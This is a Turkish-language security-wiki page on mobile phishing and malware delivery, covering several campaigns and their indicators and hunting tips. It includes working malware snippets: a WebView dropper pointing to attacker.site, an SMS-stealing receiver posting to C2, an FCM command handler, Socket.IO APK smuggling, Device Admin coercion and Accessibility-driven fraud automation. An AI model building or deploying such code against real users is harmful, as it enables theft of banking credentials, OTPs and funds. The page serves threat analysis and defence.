# Mobile Phishing & Kötü Amaçlı Uygulama Dağıtımı (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Bu sayfa, tehdit aktörlerinin SEO, sosyal mühendislik, sahte mağazalar, dating uygulamaları vb. yoluyla **malicious Android APKs** ve **iOS mobile-configuration profiles** dağıtmak için kullandıkları teknikleri kapsar.
> Materyal, Zimperium zLabs tarafından ifşa edilen SarangTrap kampanyasından (2025) ve diğer açık kaynak araştırmalardan uyarlanmıştır.

## Saldırı Akışı

1. **SEO/Phishing Altyapısı**
* Dating, cloud share, car service gibi look-alike domain’ler kaydedin.
– Google sıralaması için `<title>` elementinde yerel dil anahtar kelimeleri ve emoji kullanın.
– Aynı landing page’de hem Android (`.apk`) hem de iOS kurulum talimatlarını barındırın.
2. **Birinci Aşama İndirme**
* Android: *unsigned* veya “third-party store” APK’ye direkt link.
* iOS: `itms-services://` veya plain HTTPS link ile kötü amaçlı bir **mobileconfig** profile (aşağıya bak).
3. **Post-install Sosyal Mühendislik**
* İlk çalıştırmada uygulama bir **invitation / verification code** ister (özel erişim illüzyonu).
* Kod **HTTP üzerinden POST** ile Command-and-Control (C2)’ye gönderilir.
* C2 `{"success":true}` yanıtı verir ➜ malware devam eder.
* Geçerli bir kod göndermeyen sandbox/AV dinamik analizi **zararlı davranış görmez** (evasion).
4. **Çalışma Zamanı İzin Kötüye Kullanımı** (Android)
* Tehlikeli izinler yalnızca **C2’den olumlu yanıt alındıktan sonra** istenir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Yeni varyantlar `AndroidManifest.xml` içindeki SMS için `<uses-permission>` satırını **kaldırıyor** fakat Java/Kotlin kod yolunu reflection ile SMS okumaya izin verecek şekilde bırakıyor ⇒ statik skor düşüyor, AppOps kötüye kullanımı veya eski hedeflerde hâlâ işlevsel kalıyor.
5. **Sahte UI & Arka Plan Toplama**
* Uygulama yerel olarak uygulanmış zararsız görünüşler (SMS viewer, gallery picker) gösterir.
* Bu sırada exfiltrate eder:
- IMEI / IMSI, telefon numarası
- Full `ContactsContract` dump (JSON array)
- `/sdcard/DCIM`’den JPEG/PNG’leri [Luban](https://github.com/Curzibn/Luban) ile sıkıştırarak boyutu küçültme
- Opsiyonel SMS içeriği (`content://sms`)
Payloadlar **batch-zipped** edilip `HTTP POST /upload.php` ile gönderilir.
6. **iOS Teslim Tekniği**
* Tek bir **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyerek cihazı “MDM” benzeri gözetim altına alabilir.
* Sosyal-mühendislik talimatları:
1. Settings’i açın ➜ *Profile downloaded*.
2. Phishing sayfasındaki ekran görüntülerine göre *Install* üç kez dokunun.
3. İmzalanmamış profile güven verin ➜ saldırgan App Store incelemesi olmadan *Contacts* ve *Photo* yetkisini elde eder.
7. **Ağ Katmanı**
* Plain HTTP, genelde port 80 üzerinde, HOST header `api.<phishingdomain>.com` gibi.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS yok → tespit kolay).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Malware değerlendirmesi sırasında davet kodu aşamasını Frida/Objection ile otomatikleştirerek zararlı dala ulaşın.
* **Manifest vs. Runtime Diff** – `aapt dump permissions` ile runtime `PackageManager#getRequestedPermissions()`’ı karşılaştırın; eksik tehlikeli izinler kırmızı bayraktır.
* **Network Canary** – Kod girişinden sonra gerçekleşen düzensiz POST patlamalarını tespit etmek için `iptables -p tcp --dport 80 -j NFQUEUE` yapılandırın.
* **mobileconfig Inspection** – macOS’te `security cms -D -i profile.mobileconfig` kullanarak `PayloadContent`’ı listeleyin ve aşırı yetkilendirmeleri tespit edin.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: davet kodunu otomatik atlatma</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Göstergeler (Genel)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video tuzağı → açıklamada kısa bir bağlantı bulunur
- Kısa bağlantı → GitHub Pages phishing sitesi meşru portalı taklit eder
- Aynı GitHub repo, dosyaya doğrudan bağlanan sahte “Google Play” rozeti olan bir APK barındırır
- Dinamik phishing sayfaları Replit üzerinde barındırılır; uzaktan komut kanalı Firebase Cloud Messaging (FCM) kullanır

### Dropper with embedded payload and offline install
- İlk APK, gerçek malware'i `assets/app.apk` içinde taşıyan bir installer (dropper) olarak davranır ve kullanıcıyı bulut tespitini zayıflatmak için Wi‑Fi/mobil veriyi devre dışı bırakmaya teşvik eder.
- Gömülü payload, zararsız görünen bir ad altında (örn. “Secure Update”) kurulur. Kurulumdan sonra hem installer hem de payload ayrı uygulamalar olarak bulunur.

Statik triage ipucu (embedded payloads için grep kullanın):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Kısa bağlantı (shortlink) yoluyla dinamik uç nokta keşfi
- Malware, düz metin, virgülle ayrılmış bir canlı uç noktalar listesini kısa bağlantıdan alır; basit dize dönüşümleri nihai phishing sayfası yolunu oluşturur.

Örnek (sansürlenmiş):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” adımı, dinamik endpoint'ten gelen saldırgan HTML formunu bir WebView içinde yükler ve hassas alanları (telefon, banka, UPI PIN) yakalar; bu alanlar `POST` ile `addup.php`'ye gönderilir.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- İlk çalıştırmada agresif izinler talep edilir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kişiler, kurbanın cihazından toplu smishing SMS göndermek için döngüye alınır.
- Gelen SMS'ler bir broadcast alıcısı tarafından yakalanır ve meta verilerle (gönderen, içerik, SIM yuvası, cihaza özel rastgele ID) `/addsm.php`'ye yüklenir.

Alıcı taslağı:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) olarak dayanıklı C2
- Payload, FCM'ye kayıt olur; push mesajları, eylemleri tetiklemek için switch olarak kullanılan `_type` alanını taşır (ör. phishing metin şablonlarını güncelleme, davranışları açıp kapama).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler taslağı:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Göstergeler/IOCs
- APK ikincil payload'ı `assets/app.apk` içinde barındırır
- WebView `gate.htm`'den ödeme sayfası yükler ve `/addup.php`'e exfiltrates
- SMS exfiltration `/addsm.php`'e
- Shortlink-driven config fetch (ör. `rebrand.ly/*`) CSV endpoints döndürür
- Uygulamalar generic “Update/Secure Update” olarak etiketlenmiş
- Güvenilmeyen uygulamalarda `_type` discriminator'ına sahip FCM `data` mesajları

---

## Socket.IO/WebSocket tabanlı APK Smuggling + Sahte Google Play Sayfaları

Saldırganlar statik APK linklerini giderek daha fazla Google Play görünümlü tuzaklara gömülü bir Socket.IO/WebSocket kanalıyla değiştiriyor. Bu, payload URL'sini gizler, URL/uzantı filtrelerini atlatır ve gerçekçi bir kurulum UX'i korur.

Gerçek dünyada gözlemlenen tipik istemci akışı:

<details>
<summary>Socket.IO sahte Play indiricisi (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Basit kontrollerden nasıl kaçınır:
- Statik bir APK URL'si ifşa edilmez; payload, WebSocket frames'ten bellekte yeniden oluşturulur.
- URL/MIME/extension filtreleri doğrudan .apk yanıtlarını engellese bile WebSockets/Socket.IO üzerinden tünellenen ikili veriyi kaçırabilir.
- WebSockets'i çalıştırmayan crawlers ve URL sandbox'ları payload'u almayacektir.

Ayrıca bakınız: WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn vaka incelemesi

RatOn banker/RAT kampanyası (ThreatFabric), modern mobil phishing operasyonlarının WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover ve hatta NFC-relay orchestration'ı nasıl harmanladığının somut bir örneğidir. Bu bölüm yeniden kullanılabilir teknikleri soyutlar.

### Stage-1: WebView → native install bridge (dropper)

Saldırganlar, saldırgan bir sayfaya işaret eden bir WebView gösterir ve native installer'ı açığa çıkaran bir JavaScript interface'i enjekte eder. Bir HTML düğmesine dokunmak, dropper'ın assets'inde paketlenmiş ikinci aşama bir APK'yı kuran native koda çağrı yapar ve ardından onu doğrudan başlatır.

Minimal desen:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

Sayfadaki HTML:
```html
<button onclick="bridge.installApk()">Install</button>
```
Yüklemeden sonra, dropper payload'u explicit package/activity aracılığıyla başlatır:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting fikri: untrusted apps calling `addJavascriptInterface()` ve WebView'e installer-benzeri yöntemler açmak; APK `assets/` altında gömülü ikincil bir payload taşımak ve Package Installer Session API'yi çağırmak.

### Onay hunisi: Accessibility + Device Admin + izleyen runtime istemleri
Stage-2, “Access” sayfasını barındıran bir WebView açar. Butonu, kurbanı Accessibility ayarlarına götüren ve rogue servisi etkinleştirmeyi talep eden exported bir yöntemi çağırır. Bir kez verildiğinde, malware Accessibility'i kullanarak sonraki runtime izin diyaloglarında (contacts, overlay, manage system settings, vb.) otomatik olarak ilerler ve Device Admin ister.

- Accessibility, node ağacında “Allow”/“OK” gibi düğmeleri bularak ve tıklama olayları göndererek sonraki istemleri programatik olarak kabul etmeye yardımcı olur.
- Overlay permission kontrol/isteği:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Ayrıca bakınız:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView üzerinden overlay phishing/ransom
Operatörler aşağıdaki komutları verebilir:
- bir URL'den tam ekran overlay göstermek, veya
- bir inline HTML geçirip bunun bir WebView overlay içinde yüklenmesini sağlamak.

Olası kullanımlar: coercion (PIN entry), cüzdan açarak PIN yakalama, ransom mesajlaşması. Eksikse overlay izninin verildiğinden emin olmak için bir komut bulundurun.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periyodik olarak Accessibility node ağacını dök, görünür metinleri/rolleri/bounds'u serileştir ve bunları pseudo-ekran olarak C2'ye gönder (tek seferlik `txt_screen` ve sürekli `screen_live` gibi komutlar).
- High-fidelity: MediaProjection isteğinde bulun ve talep üzerine screen-casting/recording başlat (`display` / `record` gibi komutlar).

### ATS playbook (banka uygulaması otomasyonu)
Verilen bir JSON görevi halinde, banka uygulamasını açın, metin sorguları ve koordinat tıklamalarının karışımıyla Accessibility üzerinden UI'yi yönlendirin ve istendiğinde kurbanın ödeme PIN'ini girin.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Bir hedef akışında görülen örnek metinler (CZ → EN):
- "Nová platba" → "Yeni ödeme"
- "Zadat platbu" → "Ödeme gir"
- "Nový příjemce" → "Yeni alıcı"
- "Domácí číslo účtu" → "Yurtiçi hesap numarası"
- "Další" → "İleri"
- "Odeslat" → "Gönder"
- "Ano, pokračovat" → "Evet, devam et"
- "Zaplatit" → "Öde"
- "Hotovo" → "Tamamlandı"

Operatörler ayrıca transfer limitlerini `check_limit` ve `limit` gibi komutlarla kontrol edebilir veya artırabilir; bu komutlar limitler UI'sında benzer şekilde gezinir.

### Crypto wallet seed extraction
Hedefler: MetaMask, Trust Wallet, Blockchain.com, Phantom gibi. Akış: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Diller arasında gezinmeyi kararlı hale getirmek için locale-aware selectors (EN/RU/CZ/SK) uygulayın.

### Device Admin coercion
Device Admin APIs, PIN-capture fırsatlarını artırmak ve mağduru zor duruma düşürmek için kullanılır:

- Anında kilitleme:
```java
dpm.lockNow();
```
- Mevcut kimlik bilgisinin süresini sona erdirerek değişikliği zorla (Erişilebilirlik yeni PIN/şifreyi yakalar):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Biometrik olmayan kilidi zorla, keyguard biyometrik özelliklerini devre dışı bırakarak:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Not: Birçok DevicePolicyManager denetimi son Android sürümlerinde Device Owner/Profile Owner gerektirir; bazı OEM build'leri daha gevşek olabilir. Hedef OS/OEM üzerinde her zaman doğrulayın.

### NFC röle orkestrasyonu (NFSkate)
Stage-3, harici bir NFC-relay modülünü (ör. NFSkate) kurup başlatabilir ve röle sırasında mağduru yönlendirmek için bir HTML şablonu bile verebilir. Bu, online ATS ile birlikte temassız card-present nakit çekimini mümkün kılar.

Arka plan: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operatör komut seti (örnek)
- UI/durum: `txt_screen`, `screen_live`, `display`, `record`
- Sosyal: `send_push`, `Facebook`, `WhatsApp`
- Overlay'ler: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Cüzdanlar: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Cihaz: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- İletişim/Keşif: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Erişilebilirlik tabanlı ATS tespit önleme: insan-benzeri metin ritmi ve çift metin enjeksiyonu (Herodotus)

Tehdit aktörleri giderek Erişilebilirlik tabanlı otomasyonu, temel davranış biyometrilerine karşı ayarlanmış tespit önleme ile harmanlıyor. Yakın zamanda görülen bir banker/RAT iki tamamlayıcı metin iletim modu ve rastgeleleştirilmiş ritimle insan yazmasını simüle eden bir operatör anahtarı gösteriyor.

- Keşif modu: işlem yapmadan önce girdileri (ID, text, contentDescription, hint, bounds) hassas şekilde hedeflemek için seçiciler ve bounds ile görünür node'ları listele.
- Çift metin enjeksiyonu:
  - Mod 1 – `ACTION_SET_TEXT` hedef node üzerinde doğrudan (kararlı, klavye yok);
  - Mod 2 – panoya ayarlama + `ACTION_PASTE` ile odaklanmış node'a yapıştırma (doğrudan setText engellendiğinde çalışır).
- İnsan-benzeri ritim: operatörün verdiği diziyi karakter karakter ayırıp olaylar arasında 300–3000 ms arası rastgele gecikmelerle ileterek “machine-speed typing” heuristiklerinden kaçınma. Bu ya `ACTION_SET_TEXT` ile değeri kademeli olarak büyüterek ya da karakter karakter yapıştırarak uygulanır.

<details>
<summary>Java taslağı: node keşfi + setText veya clipboard+paste ile karakter başına gecikmeli giriş</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Dolandırıcılığı gizlemek için engelleyici overlay'ler:
- Tam ekran bir `TYPE_ACCESSIBILITY_OVERLAY` oluşturun; opaklığı operatör tarafından kontrol edilsin; uzaktan otomasyon altta ilerlerken kurban için opak tutun.
- Genellikle sunulan komutlar: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Ayarlanabilir alfa içeren minimal overlay:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Sık görülen operatör kontrol primitifleri: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Referanslar

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
